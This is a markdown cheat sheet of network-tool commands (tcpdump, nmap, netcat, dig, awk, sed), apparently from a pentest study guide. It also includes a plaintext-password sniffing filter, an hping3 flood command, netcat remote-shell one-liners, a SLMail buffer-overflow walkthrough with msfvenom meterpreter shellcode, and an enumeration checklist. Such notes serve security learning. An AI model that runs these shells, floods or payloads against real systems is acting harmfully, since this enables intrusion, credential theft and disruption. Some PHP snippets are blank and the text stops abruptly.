```

___

##### Tool: [tcpdump](http://www.tcpdump.org/)

###### Filter incoming (on interface) traffic (specific <ip:port>)

```bash
tcpdump -ne -i eth0 -Q in host 192.168.252.1 and port 443
```

  * `-n` - don't convert addresses (`-nn` will not resolve hostnames or ports)
  * `-e` - print the link-level headers
  * `-i [iface|any]` - set interface
  * `-Q|-D [in|out|inout]` - choose send/receive direction (`-D` - for old tcpdump versions)
  * `host [ip|hostname]` - set host, also `[host not]`
  * `[and|or]` - set logic
  * `port [1-65535]` - set port number, also `[port not]`

###### Filter incoming (on interface) traffic (specific <ip:port>) and write to a file

```bash
tcpdump -ne -i eth0 -Q in host 192.168.252.1 and port 443 -c 5 -w tcpdump.pcap
```

  * `-c [num]` - capture only num number of packets
  * `-w [filename]` - write packets to file, `-r [filename]` - reading from file

###### Capture all ICMP packets

```bash
tcpdump -nei eth0 icmp
```

###### Check protocol used (TCP or UDP) for service

```bash
tcpdump -nei eth0 tcp port 22 -vv -X | egrep "TCP|UDP"
```

###### Display ASCII text (to parse the output using grep or other)

```bash
tcpdump -i eth0 -A -s0 port 443
```

###### Grab everything between two keywords

```bash
tcpdump -i eth0 port 80 -X | sed -n -e '/username/,/=ldap/ p'
```

###### Grab user and pass ever plain http

```bash
tcpdump -i eth0  port http -l -A | egrep -i \
'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' \
--color=auto --line-buffered -B20
```

###### Extract HTTP User Agent from HTTP request header

```bash
tcpdump -ei eth0 -nn -A -s1500 -l | grep "User-Agent:"
```

###### Capture only HTTP GET and POST packets

```bash
tcpdump -ei eth0 -s 0 -A -vv \
'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' or 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'
```

or simply:

```bash
tcpdump -ei eth0 -s 0 -v -n -l | egrep -i "POST /|GET /|Host:"
```

###### Rotate capture files

```bash
tcpdump -ei eth0 -w /tmp/capture-%H.pcap -G 3600 -C 200
```

  * `-G <num>` - pcap will be created every `<num>` seconds
  * `-C <size>` - close the current pcap and open a new one if is larger than `<size>`

###### Top hosts by packets

```bash
tcpdump -ei enp0s25 -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20
```

###### Excludes any RFC 1918 private address

```bash
tcpdump -nei eth0 'not (src net (10 or 172.16/12 or 192.168/16) and dst net (10 or 172.16/12 or 192.168/16))'
```

___

##### Tool: [tcpick](http://tcpick.sourceforge.net/)

###### Analyse packets in real-time

```bash
while true ; do tcpick -a -C -r dump.pcap ; sleep 2 ; clear ; done
```

___

##### Tool: [ngrep](http://ngrep.sourceforge.net/usage.html)

```bash
ngrep -d eth0 "www.domain.com" port 443
```

  * `-d [iface|any]` - set interface
  * `[domain]` - set hostname
  * `port [1-65535]` - set port number

```bash
ngrep -d eth0 "www.domain.com" src host 10.240.20.2 and port 443
```

  * `(host [ip|hostname])` - filter by ip or hostname
  * `(port [1-65535])` - filter by port number

```bash
ngrep -d eth0 -qt -O ngrep.pcap "www.domain.com" port 443
```

  * `-q` - quiet mode (only payloads)
  * `-t` - added timestamps
  * `-O [filename]` - save output to file, `-I [filename]` - reading from file

```bash
ngrep -d eth0 -qt 'HTTP' 'tcp'
```

  * `HTTP` - show http headers
  * `tcp|udp` - set protocol
  * `[src|dst] host [ip|hostname]` - set direction for specific node

```bash
ngrep -l -q -d eth0 -i "User-Agent: curl*"
```

  * `-l` - stdout line buffered
  * `-i` - case-insensitive search

___

##### Tool: [hping3](http://www.hping.org/)

```bash
hping3 -V -p 80 -s 5050 <scan_type> www.google.com
```

  * `-V|--verbose` - verbose mode
  * `-p|--destport` - set destination port
  * `-s|--baseport` - set source port
  * `<scan_type>` - set scan type
    * `-F|--fin` - set FIN flag, port open if no reply
    * `-S|--syn` - set SYN flag
    * `-P|--push` - set PUSH flag
    * `-A|--ack` - set ACK flag (use when ping is blocked, RST response back if the port is open)
    * `-U|--urg` - set URG flag
    * `-Y|--ymas` - set Y unused flag (0x80 - nullscan), port open if no reply
    * `-M 0 -UPF` - set TCP sequence number and scan type (URG+PUSH+FIN), port open if no reply

```bash
hping3 -V -c 1 -1 -C 8 www.google.com
```

  * `-c [num]` - packet count
  * `-1` - set ICMP mode
  * `-C|--icmptype [icmp-num]` - set icmp type (default icmp-echo = 8)

```bash
hping3 -V -c 1000000 -d 120 -S -w 64 -p 80 --flood --rand-source <remote_host>
```

  * `--flood` - sent packets as fast as possible (don't show replies)
  * `--rand-source` - random source address mode
  * `-d --data` - data size
  * `-w|--win` - winsize (default 64)

___

##### Tool: [nmap](https://nmap.org/)

###### Ping scans the network

```bash
nmap -sP 192.168.0.0/24
```

###### Show only open ports

```bash
nmap -F --open 192.168.0.0/24
```

###### Full TCP port scan using with service version detection

```bash
nmap -p 1-65535 -sV -sS -T4 192.168.0.0/24
```

###### Nmap scan and pass output to Nikto

```bash
nmap -p80,443 192.168.0.0/24 -oG - | nikto.pl -h -
```

###### Recon specific ip:service with Nmap NSE scripts stack

```bash
# Set variables:
_hosts="192.168.250.10"
_ports="80,443"

# Set Nmap NSE scripts stack:
_nmap_nse_scripts="+dns-brute,\
                   +http-auth-finder,\
                   +http-chrono,\
                   +http-cookie-flags,\
                   +http-cors,\
                   +http-cross-domain-policy,\
                   +http-csrf,\
                   +http-dombased-xss,\
                   +http-enum,\
                   +http-errors,\
                   +http-git,\
                   +http-grep,\
                   +http-internal-ip-disclosure,\
                   +http-jsonp-detection,\
                   +http-malware-host,\
                   +http-methods,\
                   +http-passwd,\
                   +http-phpself-xss,\
                   +http-php-version,\
                   +http-robots.txt,\
                   +http-sitemap-generator,\
                   +http-shellshock,\
                   +http-stored-xss,\
                   +http-title,\
                   +http-unsafe-output-escaping,\
                   +http-useragent-tester,\
                   +http-vhosts,\
                   +http-waf-detect,\
                   +http-waf-fingerprint,\
                   +http-xssed,\
                   +traceroute-geolocation.nse,\
                   +ssl-enum-ciphers,\
                   +whois-domain,\
                   +whois-ip"

# Set Nmap NSE script params:
_nmap_nse_scripts_args="dns-brute.domain=${_hosts},http-cross-domain-policy.domain-lookup=true,"
_nmap_nse_scripts_args+="http-waf-detect.aggro,http-waf-detect.detectBodyChanges,"
_nmap_nse_scripts_args+="http-waf-fingerprint.intensive=1"

# Perform scan:
nmap --script="$_nmap_nse_scripts" --script-args="$_nmap_nse_scripts_args" -p "$_ports" "$_hosts"
```

___

##### Tool: [netcat](http://netcat.sourceforge.net/)

```bash
nc -kl 5000
```

  * `-l` - listen for an incoming connection
  * `-k` - listening after client has disconnected
  * `>filename.out` - save receive data to file (optional)

```bash
nc 192.168.0.1 5051 < filename.in
```

  * `< filename.in` - send data to remote host

```bash
nc -vz 10.240.30.3 5000
```

  * `-v` - verbose output
  * `-z` - scan for listening daemons

```bash
nc -vzu 10.240.30.3 1-65535
```

  * `-u` - scan only udp ports

###### Transfer data file (archive)

```bash
server> nc -l 5000 | tar xzvfp -
client> tar czvfp - /path/to/dir | nc 10.240.30.3 5000
```

###### Launch remote shell

```bash
# 1)
server> nc -l 5000 -e /bin/bash
client> nc 10.240.30.3 5000

# 2)
server> rm -f /tmp/f; mkfifo /tmp/f
server> cat /tmp/f | /bin/bash -i 2>&1 | nc -l 127.0.0.1 5000 > /tmp/f
client> nc 10.240.30.3 5000
```

###### Simple file server

```bash
while true ; do nc -l 5000 | tar -xvf - ; done
```

###### Simple minimal HTTP Server

```bash
while true ; do nc -l -p 1500 -c 'echo -e "HTTP/1.1 200 OK\n\n $(date)"' ; done
```

###### Simple HTTP Server

  > Restarts web server after each request - remove `while` condition for only single connection.

```bash
cat > index.html << __EOF__
<!doctype html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title></title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body>

    <p>

      Hello! It's a site.

    </p>

    </body>
</html>
__EOF__
```

```bash
server> while : ; do \
(echo -ne "HTTP/1.1 200 OK\r\nContent-Length: $(wc -c <index.html)\r\n\r\n" ; cat index.html;) | \
nc -l -p 5000 \
; done
```

  * `-p` - port number

###### Simple HTTP Proxy (single connection)

```bash
#!/usr/bin/env bash

if [[ $# != 2 ]] ; then
  printf "%s\\n" \
         "usage: ./nc-proxy listen-port bk_host:bk_port"
fi

_listen_port="$1"
_bk_host=$(echo "$2" | cut -d ":" -f1)
_bk_port=$(echo "$2" | cut -d ":" -f2)

printf "  lport: %s\\nbk_host: %s\\nbk_port: %s\\n\\n" \
       "$_listen_port" "$_bk_host" "$_bk_port"

_tmp=$(mktemp -d)
_back="$_tmp/pipe.back"
_sent="$_tmp/pipe.sent"
_recv="$_tmp/pipe.recv"

trap 'rm -rf "$_tmp"' EXIT

mkfifo -m 0600 "$_back" "$_sent" "$_recv"

sed "s/^/=> /" <"$_sent" &
sed "s/^/<=  /" <"$_recv" &

nc -l -p "$_listen_port" <"$_back" | \
tee "$_sent" | \
nc "$_bk_host" "$_bk_port" | \
tee "$_recv" >"$_back"
```

```bash
server> chmod +x nc-proxy && ./nc-proxy 8080 192.168.252.10:8000
  lport: 8080
bk_host: 192.168.252.10
bk_port: 8000

client> http -p h 10.240.30.3:8080
HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: max-age=31536000
Content-Length: 2748
Content-Type: text/html; charset=utf-8
Date: Sun, 01 Jul 2018 20:12:08 GMT
Last-Modified: Sun, 01 Apr 2018 21:53:37 GMT
```

###### Create a single-use TCP or UDP proxy

```bash
### TCP -> TCP
nc -l -p 2000 -c "nc [ip|hostname] 3000"

### TCP -> UDP
nc -l -p 2000 -c "nc -u [ip|hostname] 3000"

### UDP -> UDP
nc -l -u -p 2000 -c "nc -u [ip|hostname] 3000"

### UDP -> TCP
nc -l -u -p 2000 -c "nc [ip|hostname] 3000"
```

___

##### Tool: [gnutls-cli](https://gnutls.org/manual/html_node/gnutls_002dcli-Invocation.html)

###### Testing connection to remote host (with SNI support)

```bash
gnutls-cli -p 443 google.com
```

###### Testing connection to remote host (without SNI support)

```bash
gnutls-cli --disable-sni -p 443 google.com
```

___

##### Tool: [socat](http://www.dest-unreach.org/socat/doc/socat.html)

###### Testing remote connection to port

```bash
socat - TCP4:10.240.30.3:22
```

  * `-` - standard input (STDIO)
  * `TCP4:<params>` - set tcp4 connection with specific params
    * `[hostname|ip]` - set hostname/ip
    * `[1-65535]` - set port number

###### Redirecting TCP-traffic to a UNIX domain socket under Linux

```bash
socat TCP-LISTEN:1234,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
```

  * `TCP-LISTEN:<params>` - set tcp listen with specific params
    * `[1-65535]` - set port number
    * `bind=[hostname|ip]` - set bind hostname/ip
    * `reuseaddr` - allows other sockets to bind to an address
    * `fork` - keeps the parent process attempting to produce more connections
    * `su=nobody` - set user
    * `range=[ip-range]` - ip range
  * `UNIX-CLIENT:<params>` - communicates with the specified peer socket
    * `filename` - define socket

___

##### Tool: [p0f](http://lcamtuf.coredump.cx/p0f3/)

###### Set iface in promiscuous mode and dump traffic to the log file

```bash
p0f -i enp0s25 -p -d -o /dump/enp0s25.log
```

  * `-i` - listen on the specified interface
  * `-p` - set interface in promiscuous mode
  * `-d` - fork into background
  * `-o` - output file

___

##### Tool: [netstat](https://en.wikipedia.org/wiki/Netstat)

###### Graph # of connections for each hosts

```bash
netstat -an | awk '/ESTABLISHED/ { split($5,ip,":"); if (ip[1] !~ /^$/) print ip[1] }' | \
sort | uniq -c | awk '{ printf("%s\t%s\t",$2,$1) ; for (i = 0; i < $1; i++) {printf("*")}; print "" }'
```

###### Monitor open connections for specific port including listen, count and sort it per IP

```bash
watch "netstat -plan | grep :443 | awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1"
```

###### Grab banners from local IPv4 listening ports

```bash
netstat -nlt | grep 'tcp ' | grep -Eo "[1-9][0-9]*" | xargs -I {} sh -c "echo "" | nc -v -n -w1 127.0.0.1 {}"
```

___

##### Tool: [rsync](https://en.wikipedia.org/wiki/Rsync)

###### Rsync remote data as root using sudo

```bash
rsync --rsync-path 'sudo rsync' username@hostname:/path/to/dir/ /local/
```

___

##### Tool: [host](https://en.wikipedia.org/wiki/Host_(Unix))

###### Resolves the domain name (using external dns server)

```bash
host google.com 9.9.9.9
```

###### Checks the domain administrator (SOA record)

```bash
host -t soa google.com 9.9.9.9
```

___

##### Tool: [dig](https://en.wikipedia.org/wiki/Dig_(command))

###### Resolves the domain name (short output)

```bash
dig google.com +short
```

###### Lookup NS record for specific domain

```bash
dig @9.9.9.9 google.com NS
```

###### Query only answer section

```bash
dig google.com +nocomments +noquestion +noauthority +noadditional +nostats
```

###### Query ALL DNS Records

```bash
dig google.com ANY +noall +answer
```

###### DNS Reverse Look-up

```bash
dig -x 172.217.16.14 +short
```

___

##### Tool: [certbot](https://certbot.eff.org/)

###### Generate multidomain certificate

```bash
certbot certonly -d example.com -d www.example.com
```

###### Generate wildcard certificate

```bash
certbot certonly --manual --preferred-challenges=dns -d example.com -d *.example.com
```

###### Generate certificate with 4096 bit private key

```bash
certbot certonly -d example.com -d www.example.com --rsa-key-size 4096
```

___

##### Tool: [network-other](https://github.com/trimstray/the-book-of-secret-knowledge#tool-network-other)

###### Get all subnets for specific AS (Autonomous system)

```bash
AS="AS32934"
whois -h whois.radb.net -- "-i origin ${AS}" | \
grep "^route:" | \
cut -d ":" -f2 | \
sed -e 's/^[ \t]//' | \
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 | \
cut -d ":" -f2 | \
sed -e 's/^[ \t]/allow /' | \
sed 's/$/;/' | \
sed 's/allow  */subnet -> /g'
```

###### Resolves domain name from dns.google.com with curl and jq

```bash
_dname="google.com" ; curl -s "https://dns.google.com/resolve?name=${_dname}&type=A" | jq .
```

##### Tool: [git](https://git-scm.com/)

###### Log alias for a decent view of your repo

```bash
# 1)
git log --oneline --decorate --graph --all

# 2)
git log --graph \
--pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' \
--abbrev-commit
```

___

##### Tool: [python](https://www.python.org/)

###### Static HTTP web server

```bash
# Python 3.x
python3 -m http.server 8000 --bind 127.0.0.1

# Python 2.x
python -m SimpleHTTPServer 8000
```

###### Static HTTP web server with SSL support

```bash
# Python 3.x
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('localhost', 4443), BaseHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="path/to/key.pem",
        certfile='path/to/cert.pem', server_side=True)

httpd.serve_forever()

# Python 2.x
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('localhost', 4443),
        SimpleHTTPServer.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="path/tp/key.pem",
        certfile='path/to/cert.pem', server_side=True)

httpd.serve_forever()
```

###### Encode base64

```bash
python -m base64 -e <<< "sample string"
```

###### Decode base64

```bash
python -m base64 -d <<< "dGhpcyBpcyBlbmNvZGVkCg=="
```

##### Tool: [awk](http://www.grymoire.com/Unix/Awk.html)

###### Search for matching lines

```bash
# egrep foo
awk '/foo/' filename
```

###### Search non matching lines

```bash
# egrep -v foo
awk '!/foo/' filename
```

###### Print matching lines with numbers

```bash
# egrep -n foo
awk '/foo/{print FNR,$0}' filename
```

###### Print the last column

```bash
awk '{print $NF}' filename
```

###### Find all the lines longer than 80 characters

```bash
awk 'length($0)>80{print FNR,$0}' filename
```

###### Print only lines of less than 80 characters

```bash
awk 'length < 80' filename
```

###### Print double new lines a file

```bash
awk '1; { print "" }' filename
```

###### Print line numbers

```bash
awk '{ print FNR "\t" $0 }' filename
awk '{ printf("%5d : %s\n", NR, $0) }' filename   # in a fancy manner
```

###### Print line numbers for only non-blank lines

```bash
awk 'NF { $0=++a " :" $0 }; { print }' filename
```

###### Print the line and the next two (i=5) lines after the line matching regexp

```bash
awk '/foo/{i=5+1;}{if(i){i--; print;}}' filename
```

###### Print the lines starting at the line matching 'server {' until the line matching '}'

```bash
awk '/server {/,/}/' filename
```

###### Print multiple columns with separators

```bash
awk -F' ' '{print "ip:\t" $2 "\n port:\t" $3' filename
```

###### Remove empty lines

```bash
awk 'NF > 0' filename

# alternative:
awk NF filename
```

###### Delete trailing white space (spaces, tabs)

```bash
awk '{sub(/[ \t]*$/, "");print}' filename
```

###### Delete leading white space

```bash
awk '{sub(/^[ \t]+/, ""); print}' filename
```

###### Remove duplicate consecutive lines

```bash
# uniq
awk 'a !~ $0{print}; {a=$0}' filename
```

###### Remove duplicate entries in a file without sorting

```bash
awk '!x[$0]++' filename
```

###### Exclude multiple columns

```bash
awk '{$1=$3=""}1' filename
```

###### Substitute foo for bar on lines matching regexp

```bash
awk '/regexp/{gsub(/foo/, "bar")};{print}' filename
```

###### Add some characters at the beginning of matching lines

```bash
awk '/regexp/{sub(/^/, "++++"); print;next;}{print}' filename
```

###### Get the last hour of Apache logs

```bash
awk '/'$(date -d "1 hours ago" "+%d\\/%b\\/%Y:%H:%M")'/,/'$(date "+%d\\/%b\\/%Y:%H:%M")'/ { print $0 }' \
/var/log/httpd/access_log
```

___

##### Tool: [sed](http://www.grymoire.com/Unix/Sed.html)

###### Print a specific line from a file

```bash
sed -n 10p /path/to/file
```

###### Remove a specific line from a file

```bash
sed -i 10d /path/to/file
# alternative (BSD): sed -i'' 10d /path/to/file
```

###### Remove a range of lines from a file

```bash
sed -i <file> -re '<start>,<end>d'
```

###### Replace newline(s) with a space

```bash
sed ':a;N;$!ba;s/\n/ /g' /path/to/file

# cross-platform compatible syntax:
sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' /path/to/file
```

- `:a` create a label `a`
- `N` append the next line to the pattern space
- `$!` if not the last line, ba branch (go to) label `a`
- `s` substitute, `/\n/` regex for new line, `/ /` by a space, `/g` global match (as many times as it can)

Alternatives:

```bash
# perl version (sed-like speed):
perl -p -e 's/\n/ /' /path/to/file

# bash version (slow):
while read line ; do printf "%s" "$line " ; done < file
```

###### Delete string +N next lines

```bash
sed '/start/,+4d' /path/to/file
```

___

##### Tool: [grep](http://www.grymoire.com/Unix/Grep.html)

###### Search for a "pattern" inside all files in the current directory

```bash
grep -rn "pattern"
grep -RnisI "pattern" *
fgrep "pattern" * -R
```

###### Show only for multiple patterns

```bash
grep 'INFO*'\''WARN' filename
grep 'INFO\|WARN' filename
grep -e INFO -e WARN filename
grep -E '(INFO|WARN)' filename
egrep "INFO|WARN" filename
```

###### Except multiple patterns

```bash
grep -vE '(error|critical|warning)' filename
```

###### Show data from file without comments

```bash
grep -v ^[[:space:]]*# filename
```

###### Show data from file without comments and new lines

```bash
egrep -v '#|^$' filename
```

###### Show strings with a dash/hyphen

```bash
grep -e -- filename
grep -- -- filename
grep "\-\-" filename
```

###### Remove blank lines from a file and save output to new file

```bash
grep . filename > newfilename
```

##### Tool: [perl](https://www.perl.org/)



###### Search and replace (in place)

```bash
perl -i -pe's/SEARCH/REPLACE/' filename
```

###### Edit of `*.conf` files changing all foo to bar (and backup original)

```bash
perl -p -i.orig -e 's/\bfoo\b/bar/g' *.conf
```

###### Prints the first 20 lines from `*.conf` files

```bash
perl -pe 'exit if $. > 20' *.conf
```

###### Search lines 10 to 20

```bash
perl -ne 'print if 10 .. 20' filename
```

###### Delete first 10 lines (and backup original)

```bash
perl -i.orig -ne 'print unless 1 .. 10' filename
```

###### Delete all but lines between foo and bar (and backup original)

```bash
perl -i.orig -ne 'print unless /^foo$/ .. /^bar$/' filename
```

###### Reduce multiple blank lines to a single line

```bash
perl -p -i -00pe0 filename
```

###### Convert tabs to spaces (1t = 2sp)

```bash
perl -p -i -e 's/\t/  /g' filename
```

###### Read input from a file and report number of lines and characters

```bash
perl -lne '$i++; $in += length($_); END { print "$i lines, $in characters"; }' filename
```

#### Shell Tricks &nbsp;[<sup>[TOC]</sup>](#anger-table-of-contents)

When you get a shell, it is generally not very clean, but after following these steps, you will have a fairly clean and comfortable shell to work with.

1) `script /dev/null -c bash`
2) Ctrl-Z (to send it to background)
3) `stty raw -echo; fg` (returns the shell to foreground)
4) `reset` (to reset terminal)
5) `xterm` (when asked for terminal type)
6) `export TERM=xterm; export SHELL=bash`

#### Shell functions &nbsp;[<sup>[TOC]</sup>](#anger-table-of-contents)

##### Table of Contents

- [Domain resolve](#domain-resolve)
- [Get ASN](#get-asn)

###### Domain resolve

```bash
# Dependencies:
#   - curl
#   - jq

function DomainResolve() {

  local _host="$1"

  local _curl_base="curl --request GET"
  local _timeout="15"

  _host_ip=$($_curl_base -ks -m "$_timeout" "https://dns.google.com/resolve?name=${_host}&type=A" | \
  jq '.Answer[0].data' | tr -d "\"" 2>/dev/null)

  if [[ -z "$_host_ip" ]] || [[ "$_host_ip" == "null" ]] ; then

    echo -en "Unsuccessful domain name resolution.\\n"

  else

    echo -en "$_host > $_host_ip\\n"

  fi

}
```

Example:

```bash
shell> DomainResolve nmap.org
nmap.org > 45.33.49.119

shell> DomainResolve nmap.org
Unsuccessful domain name resolution.
```

###### Get ASN

```bash
# Dependencies:
#   - curl

function GetASN() {

  local _ip="$1"

  local _curl_base="curl --request GET"
  local _timeout="15"

  _asn=$($_curl_base -ks -m "$_timeout" "http://ip-api.com/line/${_ip}?fields=as")

  _state=$(echo $?)

  if [[ -z "$_ip" ]] || [[ "$_ip" == "null" ]] || [[ "$_state" -ne 0 ]]; then

    echo -en "Unsuccessful ASN gathering.\\n"

  else

    echo -en "$_ip > $_asn\\n"

  fi

}
```

Example:

```bash
shell> GetASN 1.1.1.1
1.1.1.1 > AS13335 Cloudflare, Inc.

shell> GetASN 0.0.0.0
Unsuccessful ASN gathering.
```

# Buffer Overflows

There are three main ways of identifying flaws in applications

- If the source code of the application is available, then source code review is probably the easiest way to identify bugs.
- If the application is closed source, you can use reverse engineering techniques, or fuzzing, to find bugs.

## A look inside Stack while a simple app is running

![](./../images/inside_stack.png)

## Fuzzing

- Fuzzing involves sending malformed data into application input and watching for unexpected crashes.
- An unexpected crash indicates that the application might not filter certain input correctly. This could lead to discovering an exploitable vulnerability.

### A Word About DEP and ASLR

- __DEP__ (Data Execution Prevention) is a set of hardware, and software, technologies that perform additional checks on memory, to help prevent malicious code from running on a system.
- The primary benefit of __DEP__ is to help prevent code execution from data pages, by raising an exception, when execution occurs.
- __ASLR__ (Address Space Layout Randomization) randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted.

#### Interacting with the POP3 Protocol

  > if the protocol under examination was unknown to us, we would either need to look up the RFC of the protocol format, or learn it ourselves, using a tool like Wireshark.

- To reproduce the netcat connection usage performed earlier in the course using a Python script, our code would look similar to the following

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  print "\nSending vil buffer..."
  s.connect(('10.0.0.22',110))     #connect to IP, POP3 port
  data = s.recv(1024)     # receive banner
  print data     # print banner

  s.send('USER   test' +'\r\n')     # end username "test"
  data = s.recv(1024)     # receive reply
  print data     # print reply

  s.send('PASS test\r\n')     # send password "test"
  data = s.recv(1024)     # receive reply
  print data     # print reply

  s.close()     # close socket
  print "\nDone!"

except:
  print "Could not connect to POP3!
```

- Taking this simple script and modifying it to fuzz the password field during the login process is easy. The resulting script would look like the following.

```python
#!/usr/bin/python
import socket

# Create an array of buffers, from 10 to 2000, with increments of 20.
buffer=["A"]
counter=100

while len(buffer) <= 30:
  buffer.append("A"*counter)
  counter=counter+200

for string in buffer:
  print "Fuzzing PASS with %s bytes" %len(string)
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.recv(1024)
  s.send('USER test\r\n')
  s.recv(1024)
  s.send('PASS ' + string + '\r\n')
  s.send('QUIT\r\n')
  s.close()
```

- Run this script against your SLMail instance, while attached to __Immunity Debugger__.
- The results of running this script shows that the __Extended Instruction Pointer (EIP)__ register has been overwritten with our input buffer of As (the hex equivalent of the letter A is \x41).
- This is of particular interest to us, as the EIP register also controls the execution flow of the application.
- This means that if we craft our exploit buffer carefully, we might be able to divert the execution of the program to a place of our choosing, such as a into the memory where we can introduce some reverse shell code, as part of our buffer.

![Execution Halted in OllyDbg](./../images/33.png)

## Check for bad characters

```Shell
>> python -c \
'print "A"*80 + "B"*4 + \
"x01x02x03x04x05x06x07x08x09x0ax0bx0cx0dx0ex0fx10" + \
"x11x12x13x14x15x16x17x18x19x1ax1bx1cx1dx1ex1fx20" + \
"x21x22x23x24x25x26x27x28x29x2ax2bx2cx2dx2ex2fx30" + \
"x31x32x33x34x35x36x37x38x39x3ax3bx3cx3dx3ex3fx40" + \
"x41x42x43x44x45x46x47x48x49x4ax4bx4cx4dx4ex4fx50" + \
"x51x52x53x54x55x56x57x58x59x5ax5bx5cx5dx5ex5fx60" + \
"x61x62x63x64x65x66x67x68x69x6ax6bx6cx6dx6ex6fx70" + \
"x71x72x73x74x75x76x77x78x79x7ax7bx7cx7dx7ex7fx80" + \
"x81x82x83x84x85x86x87x88x89x8ax8bx8cx8dx8ex8fx90" + \
"x91x92x93x94x95x96x97x98x99x9ax9bx9cx9dx9ex9fxa0" + \
"xa1xa2xa3xa4xa5xa6xa7xa8xa9xaaxabxacxadxaexafxb0" + \
"xb1xb2xb3xb4xb5xb6xb7xb8xb9xbaxbbxbcxbdxbexbfxc0" + \
"xc1xc2xc3xc4xc5xc6xc7xc8xc9xcaxcbxccxcdxcexcfxd0" + \
"xd1xd2xd3xd4xd5xd6xd7xd8xd9xdaxdbxdcxddxdexdfxe0" + \
"xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0" + \
"xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"'
```

## Generate meterpreter bind-tcp payload

```Shell
>> msfvenom -p linux/x86/meterpreter/bind_tcp -b="0x00" -f python
```

```Python
# using output from last command we can create our full payload
python -c \
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"BBBB"
'print "A"*80 + "B"*4 + "x90" * (400 - 137) + \
"\xba\x8a\x2a\xb0\xa4\xd9\xed\xd9\x74\x24\xf4\x5d\x31" + \
"\xc9\xb1\x1c\x31\x55\x14\x03\x55\x14\x83\xed\xfc\x68" + \
"\xdf\xda\xd9\x34\xb9\xa9\x25\x7d\xb9\xdd\x29\x7d\x33" + \
"\x3e\x4f\xfc\xa0\xc1\x60\x33\xa6\xf3\x5b\x3c\x44\xa0" + \
"\x18\x91\xe1\x45\x16\xf4\x46\x2f\xe5\x76\xf7\xda\xf1" + \
"\x22\x92\x18\x90\xcb\x32\x8a\xed\x2a\xd8\xba\xb6\xc6" + \
"\x7b\x9b\x85\x96\x13\x98\xd2\x82\x42\xc4\x84\xf8\x1c" + \
"\xf8\x38\xed\x80\x96\x28\x5c\x69\xee\xa8\x34\xef\xa8" + \
"\xe7\x48\x3e\xab\x48\x2e\x0c\xac\xf9\xed\x3e\xcb\x70" + \
"\xa0\x3a\xd9\x03\xd1\xf5\xed\xb3\xd6\x34\x6d\x34\x07" + \
"\x9d\xde\x3d\x7a\xa2\xe0\xa3"'
```


## VNC over SSH Tunneling

- In the hosting machine

```Shell
>> sudo tightvncserver -geometry 1024x768
```

In the VNC host machine

```Shell
ssh -L 5901:localhost:5901 -i .ssh/<ssh key> -N -f <ssh_user>@<machine_ip_OR_machine_url>
```

### SSH over HTTP (Squid)

**socat**

<pre>socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999</pre>

**proxytunnel**

<pre>proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555</pre>

**proxychains**

<pre>http 192.168.1.41 3128

proxychains ssh john@127.0.0.1</pre>

![proxychains](https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png) **corkscrew**

<pre>ssh john@192.168.1.41 -t /bin/sh</pre>

![cork](https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png)

### Generic Enumeration

- port fullscan - UDP scan

### HTTP Enumeration

- dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old - banner inspection - review source code - bruteforce with cewl-based dictionary - searchsploit look at versions properly - test all the paths with the exploits, mangle it - nmap --script vuln - nmap --script safe (ssl-cert, virtual hosts) - always incercept with Burp - nikto -h - LFI, RFI, SQL, RCE, XXE, SSRF injections - PUT method all directories - Change POST body encoding with Burp - Bruteforce parameter names - dirsearch with cookie once authenticated - download vulnerable application from exploit-db and examine it

### SSH Enumeration

- shellshock - bruteforce - user_enum - Debian OpenSSL Predictable PRNG

### SMB Enumeration

- nmap --script vuln - nmap --script smb* - nmap --script smb-enum-shares,smb-ls - enum4linux

### BOF exploit-based

- change shellcode - make sure all badchars are removed - read the exploit properly in case this makes changes in the shellcode - capture traffic with wireshark making sure the entire shellcode is transmited - run the exploit several times - make sure the JMP ESP matches OS and language

### SNMP Enumeration

- snmpcheck - snmpenum

### PHP RCE

test: `````` simple shell: `````` `````` file upload: ```'); ?>``` file upload evasion: rot13 + urlencode ``````

### RCE via webshell

- All pentest monkey reverse shells: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet - msfvenom x86/linux/shell_reverse_tcp -f elf - Metasploit `web_delivery` module - which wget | nc<ip><port>

### SQLi UNION

